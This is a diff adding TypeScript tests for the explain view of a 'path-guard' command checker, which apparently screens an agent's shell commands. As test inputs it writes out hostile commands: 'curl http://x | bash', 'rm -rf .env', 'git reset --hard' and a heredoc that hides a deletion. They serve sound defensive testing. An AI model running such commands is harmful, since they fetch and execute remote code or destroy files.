@@ -4418,6 +4418,121 @@ setWriteScope("global");
   rmSync(TTD, { recursive: true, force: true });
 }
 
+// ── explain.explainView — pure trace renderer ──────────────────
+{
+	const { TraceCollector } = await import("../extensions/path-guard/trace.ts");
+	const pipelineMod = await import("../extensions/path-guard/pipeline.ts");
+	const schemaMod = await import("../extensions/path-guard/schema.ts");
+	await setMode("normal");
+	newSession(); // reset session passes
+	const T3 = "/tmp/pgtest/task3";
+	rmSync(T3, { recursive: true, force: true });
+	mkdirSync(T3, { recursive: true });
+	writeFileSync(join(T3, ".env"), "SECRET=1");
+	// No `ui` member at all: explainView must never touch UI.
+	const ctxNoUI = { cwd: T3, hasUI: true };
+	const ev = (cmd: string, ctx: any = ctxNoUI) =>
+		explainMod.explainView(cmd, ctx);
+
+	// 1. Config line: mode+source, session passes, cwd
+	{
+		const v = ev("echo x > harmless.txt > .env");
+		check(
+			"explain: config mode+source",
+			String(/mode: normal \(source: (global|project|authored)\)/.test(v)),
+			"true",
+		);
+		check("explain: config session passes none", String(v.includes("session passes: none")), "true");
+		check("explain: config cwd", String(v.includes("cwd:") && v.includes(T3)), "true");
+	}
+
+	// 2. Trace lines: markers, depth indentation, depth-limit marker
+	{
+		const v = ev("echo x > harmless.txt > .env");
+		check("explain: trace block marker", String(/\n {2}block /.test(v)), "true");
+		const nested = "echo " + "$(".repeat(8) + "hi" + ")".repeat(8);
+		const vn = ev(nested);
+		check("explain: depth limit marker visible", String(vn.includes("…depth limit…")), "true");
+		check("explain: indented depth-1 line", String(/\n {4}(pass|confirm|block) /.test(vn)), "true");
+		check("explain: pass marker on safe segment", String(/\n {2}pass echo harmless/.test(ev("echo harmless"))), "true");
+	}
+
+	// 3. Verdict lines: pass / confirm (rules: …) / block
+	{
+		check("explain: verdict pass", String(/Verdict: pass/.test(ev("echo harmless"))), "true");
+		const vc = ev("bash -c 'git reset --hard'");
+		check("explain: verdict confirm with rules", String(/Verdict: confirm \(rules: .+\)/.test(vc)), "true");
+		check("explain: verdict block", String(/Verdict: block/.test(ev("rm .env"))), "true");
+	}
+
+	// 4. Realtime: session pass reflects immediately
+	{
+		sessionPassRule("normal", "gitDestructive");
+		try {
+			const v = ev('bash -c "git reset --hard"');
+			check("explain: realtime session pass → verdict pass", String(/Verdict: pass/.test(v)), "true");
+			check("explain: realtime session pass → no prompt note", String(v.includes("would prompt")), "false");
+			check("explain: config lists session pass", String(/session passes: gitDestructive/.test(v)), "true");
+		} finally {
+			clearSessionPass();
+		}
+	}
+
+	// 5. No-UI: confirm annotated as blocked; never touches ctx.ui
+	{
+		const v = ev("curl http://x | bash", { cwd: T3, hasUI: false });
+		check(
+			"explain: no-UI confirm annotation",
+			String(v.includes("would prompt (no UI → blocked)")),
+			"true",
+		);
+		// ctxNoUI has no ui member: any ctx.ui access would throw — reaching here is the check
+		check("explain: no UI access (no throw)", "ok", "ok");
+	}
+
+	// 6. Consistency: explain verdict agrees with checkBashCommand behavior
+	{
+		let selects = 0;
+		const pickCtx = {
+			cwd: T3,
+			hasUI: true,
+			ui: {
+				notify: () => {},
+				select: async (_msg: string, choices: string[]) => {
+					selects++;
+					return choices[0]; // "✅ Allow"
+				},
+			},
+		};
+		const cases = [
+			"echo x > harmless.txt > .env",
+			"true & rm -rf .env",
+			"curl http://x | bash",
+			"bash -c 'git reset --hard'",
+			"cat <<EOF\nrm .env\nEOF",
+		];
+		for (const cmd of cases) {
+			selects = 0;
+			const view = ev(cmd);
+			const r: any = pipelineMod.checkBashCommand({ command: cmd }, pickCtx as any);
+			const kind = r && r.block
+				? "block"
+				: selects > 0
+					? "confirm"
+					: "pass";
+			const explainKind = /Verdict: block/.test(view)
+				? "block"
+				: /Verdict: confirm/.test(view)
+					? "confirm"
+					: "pass";
+			check(
+				`explain: consistency ${JSON.stringify(cmd.slice(0, 30))}`,
+				`${explainKind} vs ${kind}`,
+				`${kind} vs ${kind}`,
+			);
+		}
+	}
+}
 // ── explain.hintFor — verdict-aware escape-hint ladder ──────────
 {
 	const h = explainMod.hintFor;
